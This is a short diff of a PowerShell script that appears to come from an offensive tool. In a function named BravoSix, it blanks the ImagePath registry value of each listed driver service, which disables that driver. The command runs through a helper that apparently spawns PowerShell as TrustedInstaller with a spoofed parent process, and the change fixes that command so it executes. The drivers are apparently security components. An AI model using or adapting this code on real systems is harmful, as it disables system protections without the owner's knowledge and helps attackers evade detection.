@@ -217,7 +217,7 @@ function BravoSix {
     foreach ($drv in $drv_list) {
         if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
             Write-Host "[i] Disabling $drv" -ForegroundColor DarkRed
-            $powershellArg = "Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name ImagePath -Value ''"
+            $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name ImagePath -Value ''"
             [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
         }
     }
